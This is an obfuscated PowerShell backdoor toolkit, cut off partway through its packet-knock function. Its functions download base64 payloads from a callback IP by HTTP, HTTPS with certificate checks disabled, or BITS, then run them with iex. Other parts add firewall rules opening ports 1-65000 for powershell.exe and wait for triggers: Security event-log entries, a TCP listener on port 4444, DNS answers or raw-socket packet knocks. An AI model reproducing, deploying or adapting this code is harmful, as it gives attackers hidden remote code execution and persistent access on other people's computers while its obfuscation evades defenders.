 &('sV') ("HD7"+"f")  ([typE]("{3}{0}{7}{2}{4}{5}{6}{1}" -f 'M','er','serV','sysTE','i','Ce','PoIntmANag','.nEt.') );    &("{2}{1}{0}" -f 'TeM','-i','sEt')  ('v'+'arIablE:'+'H8gJ')  ([TYPe]("{3}{2}{1}{0}" -F'oNvErt','c','M.','sYSte')  ); &("{1}{0}" -f 'et','S') ('2'+'6k')  ([tYpE]("{2}{0}{3}{4}{1}" -f 'T','codiNg','sYsTem.TEx','.','EN')); &("{0}{2}{1}"-f'sET','M','-ITE') ("v"+"AriAb"+"L"+"e:eXk"+"w")  ( [TYpE]("{4}{0}{3}{2}{1}"-F's','.NEt.dnS','Em','T','sy') )  ; &('SV')  ("{0}{1}"-f'D','8JFH') ([TypE]("{1}{8}{3}{5}{2}{0}{6}{4}{7}" -F 'WS','S','IndO','CUR','It','Ity.prINCiPAl.w','IDEnt','Y','E') )  ;  ${eI`JS}  =[TyPE]("{1}{0}" -F'egeX','R');&("{1}{3}{0}{2}" -f 'b','sEt-VAr','le','iA') ("hE"+"8") ([tYpE]("{4}{1}{3}{5}{2}{6}{0}"-f'y','T.sOC','EsSfam','kets.','nE','AddR','iL')) ;   &("{0}{1}"-f's','Et') ('r'+'H2Iz') (  [type]("{1}{5}{0}{2}{3}{4}"-f 'oCkeTS.sock','Ne','et','Ty','pe','T.S')) ; ${o0F}=  [type]("{6}{3}{5}{2}{1}{4}{0}"-F 'YpE','L','o','OCkEts.pRot','T','oc','NET.s');   &("{0}{1}" -f 'se','t')  ("7n"+"X"+"2BS") ( [Type]("{3}{0}{2}{5}{1}{4}"-F '.','oNTrOl','soCk','nEt','COde','ETS.ioc') )  ; &("{0}{1}" -f'S','ET')  ("{1}{0}" -f'e3','X') (  [tyPe]("{2}{0}{1}{3}" -f'cKeTs.SOckEtfl','aG','neT.so','S') );  &('SV')  ('C'+'Qm') (  [tYpE]("{0}{1}"-F'dATE','tIMe') );  







function invOkE-CAllB`Ac`k`i`eX
{

	Param(
	[Parameter(mANDATory=${tr`Ue},POSitIOn=1)]
	[string]${C`A`LlB`ACKIP},
	[Parameter(mAnDAtoRy=${fa`L`se},poSItion=2)]
	[int]${mE`TH`od}=0,
	[Parameter(mANDATORy=${Fal`SE},PoSITIoN=3)]
	[string]${bi`Ts`TeMpFiLe}="$env:temp\ps_conf.cfg",
	[Parameter(MAnDAtORY=${F`A`lSe},POSITIOn=4)]
	[string]${rE`souRCe}=("{0}{1}{2}"-f '/fa','vico','n.ico'),
	[Parameter(mAnDaTory=${f`ALSE},PoSItioN=5)]
	[bool]${S`ilEnt}=${f`AlsE}
	)
	
	
	if(${C`AL`LbA`ckiP})
	{
		try {
			
			if (${mE`T`HoD} -eq 0)
			{
				
				${u`RL}="http://$CallbackIP$resource"
				if(-not ${si`l`eNt}) {&("{1}{2}{0}" -f'st','writ','e-ho') ('Ca'+'llin'+'g '+'ho'+'me '+'with'+' '+'m'+'ethod'+' '+"$method "+'t'+'o: '+"$url")}
				
				${E`Nc} = (&("{3}{1}{2}{0}" -f'ct','w-ob','je','ne') ("{0}{1}{2}"-f 'n','et.webc','lient')).("{2}{0}{4}{3}{1}"-f 'oadst','ng','downl','i','r').Invoke(${u`Rl})
			}
			
			elseif (${m`E`ThOD} -eq 1)
			{
				 ${h`d7f}::"SER`VERcE`R`TiFic`A`T`e`VALIDAtioncALL`BacK" = {${tr`uE}}
				${u`RL}="https://$CallbackIP$resource"
				if(-not ${SI`L`EnT}) {&("{1}{0}{2}" -f's','write-ho','t') ('Ca'+'lling'+' '+'ho'+'me '+'wit'+'h '+'me'+'t'+'hod '+"$method "+'to:'+' '+"$url")}
				
				${E`Nc} = (&("{1}{0}{2}" -f'-','new','object') ("{3}{2}{1}{0}" -f'bclient','we','t.','ne')).("{1}{0}{2}{3}" -f'wnlo','do','adstrin','g').Invoke(${u`Rl})
			}
			
			elseif (${MeT`hod} -eq 2)
			{
				${U`Rl}="http://$CallbackIP$resource"
				if(-not ${sILe`Nt}) { &("{2}{0}{1}"-f 'te','-host','wri') ('C'+'alling'+' '+'home'+' '+'w'+'ith '+'metho'+'d '+"$method "+'t'+'o: '+"$url")
				&("{0}{1}{2}" -f'write-','ho','st') ('BITS'+' '+'Temp'+' '+'o'+'u'+'tput '+'to'+': '+"$BitsTempFile")}
				&("{0}{2}{1}" -f'I','Module','mport-') ("{1}{0}"-f'ts*','*bi')
				&("{4}{1}{2}{3}{0}" -f 'r','t-Bi','tsTra','nsfe','Star') ${u`Rl} ${Bi`TStEM`PfiLe} -ErrorAction ("{1}{0}"-f 'top','S')
				
				${E`Nc} = &("{1}{3}{0}{2}"-f'nt','Get-','ent','Co') ${bI`T`St`EMPfi`lE} -ErrorAction ("{1}{0}" -f 'op','St')
				
				
				&("{0}{3}{2}{1}" -f'Re','-Item','ove','m') ${BITs`TEm`p`FIlE} -ErrorAction ("{1}{0}{2}{3}" -f'yC','Silentl','ontinu','e')
				
			}
			else 
			{
				if(-not ${s`IlE`NT}) { &("{2}{0}{3}{1}"-f'ri','st','w','te-ho') ("{6}{7}{1}{2}{3}{5}{0}{4}" -f' meth','ro','per call','b','od','ack','Err','or: Imp') -fore ("{1}{0}"-f'd','re')}
				return 0
			}
			
			
			if (${e`NC})
			{
				
				${B} =   ( &("{1}{0}" -f 'tem','I')  ('V'+'ARiABlE:'+'H8GJ') )."v`AlUe"::("{2}{3}{0}{4}{1}"-f 'Base6','ring','F','rom','4St').Invoke(${e`Nc})
				${D`ec} =  ( &("{1}{2}{0}{3}" -f 'L','gEt-c','hI','ditem') ("vaRi"+"able:"+"26"+"K"))."V`ALUE"::"U`TF8".("{0}{1}{2}"-f 'G','etStrin','g').Invoke(${b})
				
				
				&("{1}{0}" -f'x','ie') ${d`EC}
			}
			else
			{
				if(-not ${S`Il`enT}) { &("{2}{1}{0}" -f'host','rite-','w') ("{5}{4}{2}{0}{1}{3}" -f'a Dow','n','o Dat','loaded',' N','Error:') -fore ("{1}{0}"-f'd','re')}
				return 0
			}
		}
		catch [System.Net.WebException]{
			if(-not ${s`i`lEnT}) { &("{2}{1}{0}"-f 't','e-hos','writ') ("{4}{5}{2}{0}{1}{3}" -f 'llback fai','l','a','ed','Error: Ne','twork C') -fore ("{1}{0}"-f 'd','re')}
			return 0
		}
		catch [System.FormatException]{
			if(-not ${si`lE`Nt}) { &("{2}{1}{0}" -f't','os','write-h') ("{3}{4}{7}{5}{1}{2}{0}{8}{6}" -f'ma','4 F','or','Err','or','Base6','blem',': ','t Pro') -fore ("{1}{0}" -f 'ed','r')}
			return 0
		}
		catch [System.Exception]{
			if(-not ${SI`LE`Nt}) { &("{1}{0}{2}" -f 'ho','write-','st') ("{7}{5}{3}{2}{6}{4}{0}{1}"-f 'transfe','r','wn probl','Ukno',' ','r: ','em during','Erro') -fore ("{0}{1}"-f 're','d')}
			
			return 0
		}
	}
	else
	{
		if(-not ${s`IlE`Nt}) { &("{0}{1}{2}" -f'w','rite-ho','st') ("{7}{6}{5}{4}{2}{3}{1}{0}" -f ':(',' home ',' for the',' phone','specified',' ','t','No hos') -fore ("{0}{1}" -f 're','d')}
		return 0
	}
	
	return 1
}

function add-PSfIReW`All`R`u`les
{

	Param(
	[Parameter(MAnDatoRy=${FAl`SE},PosItIOn=1)]
	[string]${R`u`leN`AMe}=("{5}{2}{0}{4}{3}{1}"-f'ws ','rshell','indo','owe','P','W'),
	[Parameter(maNdaTORY=${FA`l`Se},positIon=2)]
	[string]${e`xEp`Ath}=((("{3}{0}{13}{6}{11}{12}{2}{1}{7}{8}{10}{14}{4}{9}{5}{15}" -f '{0}','n','2{0}wi','C:','0','shel','}sy','dowspo','wershe','}power','ll{0}v','ste','m3','windows{0','1.0{','l.exe'))-F  [cHar]92),
	[Parameter(MaNDaTOry=${F`AL`SE},PosItioN=3)]
	[string]${PO`RTs}=("{0}{1}" -f'1-6500','0')
	)

	If (-NOT ([Security.Principal.WindowsPrincipal]  ${d8`Jfh}::("{1}{3}{2}{0}" -f 't','G','en','etCurr').Invoke())."Isin`ROlE"([Security.Principal.WindowsBuiltInRole] ("{0}{2}{1}{4}{3}" -f 'Admi','tr','nis','or','at')))
	{
		&("{2}{1}{0}" -f 'ost','rite-H','W') ("{3}{9}{2}{0}{8}{7}{1}{6}{5}{4}" -f 'e',' :(... g',' r','Th',' ',' work!','et to','in','quires Adm','is command')
		Return
	}
	
	
	${fW} = &("{0}{2}{1}{3}"-f 'Ne','ec','w-Obj','t') -ComObject ("{1}{0}{2}{3}" -f 'w','hnetcfg.f','po','licy2')
	${rU`le} = &("{1}{0}{2}{3}"-f'e','N','w','-Object') -ComObject ("{2}{0}{1}{3}{4}"-f'NetCfg','.','H','FWRu','le')
	${r`uLE}."NA`ME" = ${R`ulE`Name}
	${r`ule}."ApPl`I`cA`TIOnn`AMe"=${Ex`EP`ATh}
	${r`ULE}."Pr`Oto`cOL" = 6
	${RU`lE}."loCA`lpOR`Ts" = ${Po`RTs}
	${ru`lE}."dIr`ec`TioN" = 2
	${ru`Le}."E`N`ABlEd"=${T`RUe}
	${RU`LE}."g`RO`UpinG"=("{2}{1}{0}{4}{5}{3}"-f'api.d','rewall','@fi','5','ll,-','2325')
	${r`ULE}."P`ROF`ilEs" = 7
	${rU`Le}."act`i`On"=1
	${R`uLE}."EDg`eTr`Ave`RSAl"=${f`A`Lse}
	${F`W}."RU`LeS".("{0}{1}" -f 'A','dd').Invoke(${rU`Le})
	
	
	${ru`LE} = &("{1}{2}{0}"-f'ject','New-O','b') -ComObject ("{4}{0}{3}{2}{1}"-f 'etCf','Rule','.FW','g','HN')
	${r`ulE}."N`AMe" = ${rU`LEna`Me}
	${ru`Le}."a`P`PlIca`TIoNNa`me"=${e`x`epAtH}
	${ru`Le}."p`RO`TocoL" = 17
	${RU`Le}."lO`cal`POrtS" = ${P`or`Ts}
	${rU`le}."di`RecT`Ion" = 2
	${r`ule}."ena`B`leD"=${t`RUe}
	${rU`lE}."g`Ro`upiNG"=("{2}{3}{5}{4}{1}{6}{0}" -f '55','.','@fir','e','allapi','w','dll,-232')
	${R`uLe}."pRoFi`lES" = 7
	${r`ule}."Act`Ion"=1
	${ru`lE}."Ed`GE`TrAvErsAl"=${FAL`se}
	${fw}."r`ulES".("{0}{1}" -f'Ad','d').Invoke(${R`ulE})
	
	
	${r`UlE} = &("{2}{0}{1}"-f'b','ject','New-O') -ComObject ("{3}{0}{1}{2}"-f'tCfg.F','WRul','e','HNe')
	${ru`Le}."n`Ame" = ${RU`L`E`NaME}
	${Ru`Le}."Ap`plicAtio`Nn`AME"=${exEP`A`Th}
	${rU`Le}."pr`Otoc`Ol" = 6
	${rU`Le}."LOcA`lP`oR`Ts" = ${p`o`Rts}
	${R`UlE}."d`IrecTI`on" = 1
	${rU`le}."EN`A`BLeD"=${T`RUe}
	${R`ule}."gROUp`i`Ng"=("{0}{3}{2}{5}{1}{4}" -f '@fire','dll,-','allapi','w','23255','.')
	${Ru`lE}."P`ROfIl`es" = 7
	${ru`lE}."AC`TION"=1
	${R`ULE}."EdgEt`RAv`ER`saL"=${fal`SE}
	${fw}."RuL`ES".("{0}{1}"-f 'Ad','d').Invoke(${rU`LE})
	
	
	${rU`Le} = &("{0}{1}{2}"-f 'N','ew-O','bject') -ComObject ("{2}{1}{0}"-f 'e','ul','HNetCfg.FWR')
	${R`ule}."NA`mE" = ${r`UlEN`AmE}
	${ru`lE}."ApP`lICAt`Ionna`mE"=${eXEp`Ath}
	${R`uLE}."PRotO`col" = 17
	${R`uLe}."lo`caLp`OrTS" = ${PO`Rts}
	${rU`LE}."DI`REc`TIon" = 1
	${ru`lE}."ENA`BLed"=${tR`uE}
	${rU`LE}."Gr`oUpI`Ng"=("{2}{1}{3}{0}{4}{5}{6}"-f'i.','wal','@fire','lap','dll,-','2325','5')
	${ru`lE}."profIl`es" = 7
	${r`UlE}."AC`Ti`oN"=1
	${RU`le}."E`dGetR`AVErSaL"=${f`AlSE}
	${F`W}."RUL`Es".("{0}{1}" -f'A','dd').Invoke(${Ru`le})

}

function I`N`VoKe-`eVeN`TlooP
{

	Param(
	[Parameter(MaNDatory=${TR`Ue},PoSiTIon=1)]
	[string]${CALlb`A`cK`iP},
	[Parameter(MANDAtoRy=${Fa`L`se},pOSITIoN=2)]	
	[string]${T`RiGg`er}=("{1}{0}"-f 'UB','SIXD'), 
	[Parameter(mAnDatory=${f`A`LsE},pOsITIoN=3)]
	[int]${t`I`mEOUT}=0,
	[Parameter(mAnDatOry=${f`Al`SE},pOSItIoN=4)]
	[int] ${sLe`ep}=1
	)

	If (-NOT ([Security.Principal.WindowsPrincipal]   ${d`8Jfh}::("{1}{2}{0}" -f'rrent','Get','Cu').Invoke())."i`Sin`RoLE"([Security.Principal.WindowsBuiltInRole] ("{3}{0}{4}{2}{1}" -f'dmi','tor','tra','A','nis')))
	{
		&("{0}{2}{1}"-f'Wr','e-Host','it') ("{13}{4}{3}{7}{9}{11}{2}{6}{8}{1}{5}{10}{12}{0}" -f ' ','et ','s Admin :','r','is backdoor ','t','(... ','eq','g','ui','o','re',' work!','Th')
		Return
	}
	
	&("{1}{2}{0}{3}" -f'-h','writ','e','ost') ('Timeou'+'t'+': '+"$Timeout")
	&("{1}{0}{2}" -f'rite-','w','host') ('T'+'ri'+'gger: '+"$Trigger")
	&("{0}{1}{2}"-f'wr','ite-ho','st') ('C'+'a'+'llbac'+'kIP: '+"$CallbackIP")
	&("{2}{1}{0}"-f 'ost','e-h','writ')
	&("{3}{1}{2}{0}" -f't','te','-hos','wri') ("{4}{0}{1}{2}{3}" -f'a','rting bac','kdo','or...','St')
	
	
	${R`U`NNinG}=${tR`ue}
	${MaT`ch} =""
	${s`T`ArttImE} = &("{1}{0}{2}"-f't-da','ge','te')
	while(${Ru`NNI`Ng})
	{
		
		if (${tI`Me`Out} -ne 0 -and ($(  (  &('lS') ('va'+'R'+'IaB'+'lE:CqM') )."V`ALue"::"N`Ow") -gt ${s`T`AR`TtiMe}.("{1}{2}{0}" -f 'seconds','ad','d').Invoke(${tI`MeOuT})))  
		{
			${R`unnI`NG}=${f`Al`Se}
		}
		
		${d} = &("{2}{0}{1}" -f'at','e','Get-D')
		${nE`Weve`NTS} = &("{0}{1}{2}" -f 'G','et-W','inEvent') -FilterHashtable @{("{1}{2}{0}" -f'me','log','na')=("{2}{1}{0}" -f'ity','ur','Sec'); ("{1}{0}{2}" -f 'ar','St','tTime')=${d}.("{0}{1}{3}{2}" -f 'Add','Sec','s','ond').Invoke(-${sl`EEp})} -ErrorAction ("{0}{3}{4}{2}{1}"-f 'Si','inue','lyCont','len','t') | &('fl') ("{1}{2}{0}"-f 'sage','M','es') | &("{3}{0}{2}{1}"-f'S','ing','tr','Out-')
		
		
		if (${nEW`EV`enTs} -match ${triGG`ER})
		{
				${rU`NN`ing}=${fAL`Se}
				${mA`T`ch} = ${CAl`lBA`CkIp}
				&("{0}{2}{1}" -f 'wr','-host','ite') ('M'+'a'+'tch: '+"$match")
		}
		&("{0}{1}" -f'sl','eep') -s ${SL`eEP}
	}
	if(${M`ATCh})
	{
		${S`u`CCess} = &("{3}{2}{4}{1}{0}"-f 'IEX','llback','vok','In','e-Ca') ${mAT`Ch}
	}
}

function InV`o`k`E-PorTbiND
{

	Param(
	[Parameter(MAnDatorY=${F`A`lse},PosItIon=1)]
	[string]${c`AllbACk`ip},
	[Parameter(MANdAToRy=${f`A`lsE},pOSiTion=2)]
	[string]${l`OCaL`Ip}, 
	[Parameter(MaNDaTOrY=${fAl`se},PosItIOn=3)]
	[int]${po`Rt}=4444, 
	[Parameter(mANDatory=${F`ALsE},posItIoN=4)]
	[string]${T`RiGGER}=("{0}{1}{2}" -f'Q','AZWS','X123'), 
	[Parameter(maNDAtoRY=${fA`LSE},poSITion=5)]
	[int]${T`IMEO`UT}=0
	)
	
	
	if (-not ${l`oCAlIp}) 
	{
		&("{1}{0}" -f 'te','rou') ("{1}{0}" -f 'int','pr') ('0*') | &('%') { 
			if (${_} -match "\s{2,}0\.0\.0\.0") { 
				${nu`LL},${NU`lL},${nu`Ll},${lo`c`ALIP},${nu`lL} =  ( &("{1}{2}{0}{3}" -f'i','G','et-vAr','Able')  ('E'+'iJs')  )."v`ALUE"::("{0}{1}{2}"-f 'rep','lac','e').Invoke(${_}.("{2}{1}{0}" -f't','r','trimsta').Invoke(" "),"\s{2,}",",").("{0}{1}"-f's','plit').Invoke(",")
				}
			}
	}
	
	
	&("{0}{1}{2}{3}"-f 'w','ri','te-','host') ("{7}{0}{1}{5}{10}{6}{12}{13}{11}{3}{4}{9}{8}{2}"-f'H','IS BACKD',' !!!','AL','L EX','OOR','RES','!!! T','ION','CEPT',' REQUI','IREW',' ','F')
	&("{2}{1}{0}"-f 't','te-hos','wri') ('Timeou'+'t'+':'+' '+"$Timeout")
	&("{0}{2}{1}" -f 'wr','ost','ite-h') ('P'+'ort:'+' '+"$Port")
	&("{2}{0}{1}"-f'ite-h','ost','wr') ('Trig'+'ger:'+' '+"$Trigger")
	&("{1}{2}{3}{0}" -f 't','write','-h','os') ('Us'+'ing '+'I'+'Pv4 '+'A'+'d'+'dr'+'ess: '+"$LocalIP")
	&("{1}{0}{2}"-f'e-ho','writ','st') ('C'+'al'+'lbackIP'+': '+"$CallbackIP")
	&("{0}{1}{2}{3}"-f'wri','te','-hos','t')
	&("{0}{1}{2}"-f'wri','t','e-host') ("{4}{5}{3}{0}{2}{1}" -f'ing ba','.','ckdoor..','t','Sta','r')
	try{
		
		
		${iPe`ND`Po`int} = &("{1}{0}{2}" -f 'w-obj','ne','ect') ("{1}{5}{2}{0}{3}{4}{6}"-f 'net.i','sys','m.','pend','p','te','oint')([net.ipaddress]"$localIP",${pO`RT})
		${LisTEN`Er} = &("{0}{1}{3}{2}"-f'new-o','b','t','jec') ("{4}{3}{1}{2}{0}{5}" -f 'ts.','Soc','ke','tem.Net.','Sys','TcpListener') ${IpE`N`DpoInt}
		${lisT`En`Er}.("{0}{1}" -f'S','tart').Invoke()
		
		
		${R`unnI`Ng}=${TR`uE}
		${M`ATCh} =""
		${S`TarT`TIme} = &("{2}{1}{0}"-f '-date','et','g')
		while(${r`unni`NG})
		{			
			
			if (${t`Imeo`uT} -ne 0 -and ($(  ${c`qM}::"N`Ow") -gt ${S`Ta`RTtIme}.("{1}{0}{2}" -f 'se','add','conds').Invoke(${TiM`EO`ut})))  
			{
				${RUNN`i`Ng}=${FAL`sE}
			}
			
			
			if(${liSte`Ner}.("{1}{0}"-f'ing','Pend').Invoke())
			{
				
				${cL`iENt} = ${liST`E`NEr}.("{1}{0}{4}{2}{3}" -f 'cce','A','cpCli','ent','ptT').Invoke()
				&("{0}{2}{1}"-f 'wri','e-host','t') ("{0}{2}{1}{3}"-f 'Cl','Connec','ient ','ted!')
				${STRE`AM} = ${C`L`Ient}.("{1}{0}{2}"-f'rea','GetSt','m').Invoke()
				${RE`AD`er} = &("{2}{0}{3}{1}" -f'j','t','new-ob','ec') ("{2}{1}{3}{0}"-f'eader','tem.IO','Sys','.StreamR') ${sTre`Am}
				
				
				${l`ine} = ${re`AdEr}.("{0}{1}"-f 'ReadLin','e').Invoke()
				
				
				if (${li`NE} -eq ${TRi`Gg`Er})
				{
					${r`un`NInG}=${Fal`Se}
					${MaT`Ch} = ([system.net.ipendpoint] ${C`LiE`NT}."CLi`e`Nt"."Rem`OTE`End`p`OiNt")."ADDr`ess".("{0}{1}"-f'T','oString').Invoke()
					&("{0}{1}{2}"-f 'wri','te-h','ost') ('MATCH'+':'+' '+"$match")
				}
				
				
				${r`eADER}.("{0}{1}"-f 'Di','spose').Invoke()
				${s`T`REAM}.("{1}{0}" -f'e','Dispos').Invoke()
				${CLiE`Nt}.("{1}{0}" -f 'se','Clo').Invoke()
				&("{1}{2}{0}{3}" -f'-hos','writ','e','t') ("{2}{1}{3}{0}"-f'cted',' Disco','Client','nne')
			}
		}
		
		
		&("{0}{1}{2}" -f 'w','rite-ho','st') ("{2}{0}{1}" -f 'ng ','Socket','Stoppi')
		${l`is`TEneR}.("{0}{1}"-f 'St','op').Invoke()
		if(${mA`Tch})
		{
			if(${c`AllB`A`ckiP})
			{
				${sUCcE`Ss} = &("{1}{4}{2}{0}{3}" -f 'IE','Invoke-Call','ack','X','b') ${cAlL`BACk`Ip}
			}
			else
			{
				${s`UcceSs} = &("{2}{0}{1}{4}{3}"-f'ke','-Callb','Invo','ckIEX','a') ${M`AtcH}
			}
		}
	}
	catch [System.Net.Sockets.SocketException] {
		&("{3}{0}{2}{1}" -f'rite','t','-hos','w') ("{2}{0}{5}{1}{4}{3}"-f'r:','cke','Erro','r','t Erro',' So') -fore ("{1}{0}"-f'd','re')
	}
}

function I`Nvok`e-`Dn`SlOOP
{

	param(
		[Parameter(MAndaTory=${F`AlSe},PosITIOn=1)]
		[string]${CA`l`lB`AcKIP},
		[Parameter(mandaTory=${f`AlsE},PoSITION=2)]
		[string]${hoS`TN`AmE}=("{0}{3}{2}{1}{4}"-f 'yay.','dub.n','x','si','et'),
		[Parameter(MandAtoRy=${Fal`sE},POsItIoN=3)]
		[string]${Tri`GG`er}=("{0}{1}{2}"-f '127','.0','.0.1'),
		[Parameter(MaNdaToRY=${F`AlSe},POSitIOn=4)]
		[int] ${TI`MEOUT}=0,
		[Parameter(maNDatOry=${Fal`SE},poSITioN=5)]
		[int] ${sLE`Ep}=1
	)
	
	
	&("{1}{0}{2}"-f'os','write-h','t') ('Timeou'+'t'+': '+"$Timeout")
	&("{0}{1}{2}" -f 'write-','ho','st') ('S'+'leep '+'T'+'ime: '+"$Sleep")
	&("{1}{0}{2}"-f 't','wri','e-host') ('T'+'r'+'igger: '+"$Trigger")
	&("{0}{2}{1}" -f'w','ite-host','r') ('Usi'+'ng'+' '+'Hostn'+'am'+'e:'+' '+"$Hostname")
	&("{1}{0}{2}" -f 'rite-ho','w','st') ('Cal'+'lbackIP'+': '+"$CallbackIP")
	&("{1}{2}{0}"-f'st','writ','e-ho')
	&("{2}{1}{0}" -f 'e-host','it','wr') ("{2}{3}{1}{4}{0}"-f'...',' back','St','arting','door')
	
	
	${rUN`N`ing}=${t`RUe}
	${MAt`ch} =""
	${STA`R`Tti`me} = &("{1}{0}" -f 'e','get-dat')
	while(${R`U`NNINg})
	{
		
		if (${tImE`OuT} -ne 0 -and ($( ${C`qm}::"n`ow") -gt ${S`TarT`Ti`ME}.("{1}{2}{3}{0}" -f'nds','a','dd','seco').Invoke(${Ti`meO`Ut})))  
		{
			${rU`N`NiNG}=${fA`L`Se}
		}
		
		try {
			
			${I`Ps} =   ( &("{0}{1}"-f'VAR','IaBLe') ('E'+'XkW')  )."Val`Ue"::("{2}{1}{4}{3}{0}"-f 'ddresses','tH','Ge','A','ost').Invoke(${h`OsTnamE})
			foreach (${Ad`DR} in ${i`ps})
			{
				
				
				${R`esOL`Ved}=${ad`Dr}."ipAddrE`Ss`TO`sTR`INg"
				if(${r`eSo`LV`eD} -ne ${tr`Ig`ger})
				{
					${Runn`iNg}=${Fa`l`SE}
					${m`At`CH}=${RES`O`Lved}
					&("{1}{2}{0}"-f 't','wr','ite-hos') ('Mat'+'ch: '+"$match")
				}
				
			}
		}
		catch [System.Net.Sockets.SocketException]{
			
		}

		&("{1}{0}"-f 'eep','sl') -s ${slE`Ep}
	}
	&("{0}{1}{2}{3}"-f 'writ','e-ho','s','t') ("{0}{6}{3}{4}{2}{1}{5}" -f'Shutting do','Check..','S ','D','N','.','wn ')
	if(${MaT`cH})
	{
		if(${CAL`LbaC`k`ip})
		{
			${S`UCC`eSs} = &("{2}{0}{3}{1}{5}{4}"-f 'k','-C','Invo','e','IEX','allback') ${c`AL`lbACKIp}
		}
		else
		{
			${s`uC`CesS} = &("{0}{4}{5}{1}{2}{3}"-f'I','l','backI','EX','nvo','ke-Cal') ${mA`T`ch}
		}
	}
}

function INvoke-`p`ACKe`TKNock
{	

	param(
	[Parameter(mandaTORy=${f`AL`SE},POSItiON=1)]
	[string]${C`ALLBa`ckIp},
	[Parameter(mANdatOry=${FAL`Se},pOsiTiOn=2)]
	[string]${LOc`ALIP}, 
	[Parameter(MaNdatory=${Fa`lSE},POsITiON=3)]
	[string]${T`RiGgER}=("{0}{2}{1}"-f'Q','X123','AZWS'), 
	[Parameter(maNDAtory=${F`A`LSe},POsITION=4)]
	[int]${T`imeOuT}=0
	)
	If (-NOT ([Security.Principal.WindowsPrincipal]  (  &("{2}{1}{0}" -f'aBle','ARI','V') ("{1}{0}" -f'Jfh','d8'))."Va`LUE"::("{1}{0}{2}"-f 'e','GetCurr','nt').Invoke())."IsI`NRoLe"([Security.Principal.WindowsBuiltInRole] ("{2}{3}{0}{1}"-f'trato','r','Admin','is')))
	{
		&("{1}{0}{2}" -f 'os','Write-H','t') ("{7}{3}{0}{2}{10}{1}{4}{9}{6}{11}{12}{8}{5}" -f'kdo','ui','or r',' bac','res Admi','! ','... ge','This','k','n :(','eq','t to ','wor')
		Return
	}
	
	if (-not ${LOc`Al`IP}) 
	{
		&("{1}{0}" -f'oute','r') ("{1}{0}" -f 't','prin') ('0*') | &('%') { 
			if (${_} -match "\s{2,}0\.0\.0\.0") { 
				${N`uLl},${nu`LL},${n`UlL},${l`Ocal`iP},${n`ULL} =  ${eI`jS}::("{0}{1}{2}"-f'repla','c','e').Invoke(${_}.("{0}{1}" -f't','rimstart').Invoke(" "),"\s{2,}",",").("{1}{0}"-f 'it','spl').Invoke(",")
				}
			}
	}
	
	
	&("{2}{0}{1}"-f'e-hos','t','writ') ("{5}{4}{2}{1}{9}{10}{7}{8}{6}{3}{11}{0}" -f'ON !!!',' ','ACKDOOR','L EXC','S B','!!! THI','IREWAL','S ','F','REQUI','RE','EPTI')
	&("{2}{1}{0}" -f'host','te-','wri') ('Time'+'ou'+'t: '+"$Timeout")
	&("{2}{3}{0}{1}" -f 'os','t','writ','e-h') ('Trig'+'ger'+': '+"$Trigger")
	&("{1}{0}{2}" -f 'te-','wri','host') ('U'+'s'+'ing '+'IPv'+'4 '+'Ad'+'dre'+'ss: '+"$LocalIP")
	&("{2}{0}{1}"-f'te-ho','st','wri') ('Ca'+'l'+'l'+'backIP: '+"$CallbackIP")
	&("{0}{1}{3}{2}" -f 'write-','h','st','o')
	&("{1}{3}{0}{2}"-f'h','w','ost','rite-') ("{1}{0}{2}{3}"-f'rting','Sta',' backdoor.','..')
	
	
	${bYT`EIN} = &("{1}{0}{2}" -f 'obj','new-','ect') ("{0}{1}" -f'byte[',']') 4
	${bY`Te`Out} = &("{2}{0}{1}" -f 'bj','ect','new-o') ("{1}{2}{0}"-f'e[]','by','t') 4
	${B`yT`eDatA} = &("{2}{1}{0}" -f't','bjec','new-o') ("{0}{1}{2}"-f 'b','yte','[]') 4096  

	${BYtE`iN}[0] = 1  
	${bY`T`eIN}[1-3] = 0
	${B`Yte`out}[0-3] = 0
	
	
	${sOC`Ket} = &("{2}{0}{1}{3}" -f 'w','-objec','ne','t') ("{1}{0}{6}{4}{2}{5}{3}" -f't','sys','ckets.sock','t','m.net.so','e','e')(  ${H`e8}::"i`NTErn`ET`wOrk",  ${RH2`iz}::"r`AW",  (&("{1}{2}{0}"-f 'iaBLe','v','Ar')  ('O'+'0F')  -vALuEo  )::"i`p")
	${Soc`K`Et}.("{0}{2}{1}"-f'setsocketop','on','ti').Invoke("IP",("{0}{3}{2}{1}{4}"-f'H','clud','aderIn','e','ed'),${T`Rue})
	${so`CK`Et}."recEivebufFE`R`S`IzE" = 819200

	
	${ip`endpOi`NT} = &("{2}{1}{0}"-f'object','w-','ne') ("{2}{0}{3}{4}{5}{1}" -f'e','point','syst','m','.','net.ipend')([net.ipaddress]"$localIP",0)
	${SOc`KET}.("{1}{0}"-f'nd','bi').Invoke(${Ip`end`Point})

	
	[void]${S`Oc`kEt}.("{2}{0}{1}"-f'ntro','l','ioco').Invoke(  ( &("{2}{3}{1}{0}" -f 'M','HIldite','gEt-','c') ("vARi"+"ab"+"l"+"E:7NX2bS")  )."va`lue"::"recei`V`E`AlL",${B`YtE`in},${byt`e`OuT})

	
	${sT`A`R`TTIME} = &("{1}{2}{0}"-f'ate','ge','t-d')
	${RU`NNIng} = ${t`Rue}
	${M`A`Tch} = ""
	${PAcK`ets} = @()
	while (${rUN`Ni`Ng})
	{
		
		if (${T`ImEo`ut} -ne 0 -and ($(  (  &("{0}{1}"-f 'gC','i') ('v'+'aRIABlE:'+'c'+'Qm')  )."v`ALUE"::"n`OW") -gt ${STa`Rt`TIMe}.("{1}{0}{2}" -f'second','add','s').Invoke(${T`iMEoUt})))  
		{
			${r`U`NnInG}=${F`A`LSE}
		}
		
		if (-not ${S`ockEt}."av`AiLAB`le")
		{
			&("{0}{1}{2}"-f 'star','t-','sleep') -milliseconds 500
			continue
		}
		
		
		${R`CV} = ${S`OCKeT}.("{0}{2}{1}" -f'rec','e','eiv').Invoke(${b`Yt`EdatA},0,${B`Y`T`EDaTa}."lEn`GtH",  ${x`E3}::"nO`NE")

		
		${mEMO`Rys`TR`E`Am} = &("{2}{0}{1}" -f'bjec','t','new-o') ("{3}{0}{4}{1}{2}"-f 'em.I','re','am','Syst','O.MemorySt')(${byT`e`DATA},0,${r`cv})
		${BIN`ARY`R`eADEr} = &("{2}{1}{0}"-f't','ew-objec','n') ("{0}{2}{1}{3}" -f'Syste','O.B','m.I','inaryReader')(${mEMO`RyS`TReAM})
		
		
		${trA`Sh}  = ${bIN`ARY`REad`ER}.("{0}{1}{3}{2}" -f 'Read','By','es','t').Invoke(12)
		
		
		${S`ourcE`iPaddrE`Ss} = ${bIn`AR`YR`EadER}.("{0}{1}{2}" -f'Read','U','Int32').Invoke()
